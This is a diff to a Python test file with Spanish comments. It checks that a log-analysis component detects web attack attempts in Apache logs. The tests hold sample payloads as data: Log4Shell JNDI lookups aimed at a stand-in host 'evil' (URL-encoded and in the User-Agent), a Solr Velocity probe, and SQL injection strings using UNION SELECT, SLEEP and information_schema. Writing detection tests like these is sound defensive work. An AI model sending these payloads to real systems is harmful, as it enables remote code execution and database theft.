@@ -5,7 +5,6 @@ Solr Velocity, Spring4Shell) se detecten correctamente sin falsos positivos
 en trafico benigno.
 """
 
-import pytest
 
 from src.agents.observer.nodes import (
     _LOG4SHELL_RE,
@@ -228,3 +227,51 @@ class TestWebshellExecGeneralized:
         logs = [_apache("10.10.0.5", "POST", "/api/users", 200)]
         p = _build_ip_profiles(logs)
         assert p["ip_profiles"]["10.10.0.5"]["webshell_execution"] == 0
+
+
+class TestUrlEncodedCveDetection:
+    """Los exploits comunmente envian payloads URL-encoded que solo matchean
+    tras unquote (). _build_ip_profiles ahora decodifica URL antes del match."""
+
+    def test_log4shell_url_encoded_in_url(self):
+        """${jndi:ldap://x} encoded como %24%7bjndi%3aldap%3a%2f%2fx%7d."""
+        encoded = "/api?q=%24%7bjndi%3aldap%3a%2f%2fevil%2fx%7d"
+        logs = [_apache("10.10.0.5", "GET", encoded, 200)]
+        p = _build_ip_profiles(logs)
+        assert p["ip_profiles"]["10.10.0.5"]["log4shell_attempts"] >= 1
+
+    def test_log4shell_plaintext_in_user_agent(self):
+        """JNDI en User-Agent suele venir plaintext — debe seguir matcheando."""
+        logs = [_apache("10.10.0.5", "GET", "/", 200, ua="${jndi:ldap://evil/a}")]
+        p = _build_ip_profiles(logs)
+        assert p["ip_profiles"]["10.10.0.5"]["log4shell_attempts"] >= 1
+
+    def test_solr_velocity_endpoint_match(self):
+        """Endpoint tipico /solr/<core>/select?wt=velocity es signal."""
+        logs = [_apache("10.10.0.5", "GET", "/solr/admin/select?q=1&wt=velocity", 200)]
+        p = _build_ip_profiles(logs)
+        assert p["ip_profiles"]["10.10.0.5"]["solr_velocity_attempts"] >= 1
+
+    def test_sqli_url_encoded_quote(self):
+        """' OR 1=1-- como %27%20OR%201%3d1%2d%2d debe detectarse."""
+        encoded_url = "/page?id=%27%20OR%201%3d1%2d%2d"
+        logs = [_apache("10.10.0.5", "GET", encoded_url, 200)]
+        p = _build_ip_profiles(logs)
+        assert p["ip_profiles"]["10.10.0.5"]["sqli_attempts"] >= 1
+
+    def test_sqli_union_with_inline_comment(self):
+        """sqlmap envia UNION/**/SELECT — antes pasaba unmatched."""
+        logs = [_apache("10.10.0.5", "GET", "/page?id=1+UNION/**/SELECT+1,2,3", 200)]
+        p = _build_ip_profiles(logs)
+        assert p["ip_profiles"]["10.10.0.5"]["sqli_attempts"] >= 1
+
+    def test_sqli_blind_sleep_function(self):
+        """Boolean blind con SLEEP() para detectar timing-based SQLi."""
+        logs = [_apache("10.10.0.5", "GET", "/page?id=1';SLEEP(5)--", 200)]
+        p = _build_ip_profiles(logs)
+        assert p["ip_profiles"]["10.10.0.5"]["sqli_attempts"] >= 1
+
+    def test_sqli_information_schema(self):
+        logs = [_apache("10.10.0.5", "GET", "/p?id=1+UNION+SELECT+table_name+FROM+information_schema.tables", 200)]
+        p = _build_ip_profiles(logs)
+        assert p["ip_profiles"]["10.10.0.5"]["sqli_attempts"] >= 1
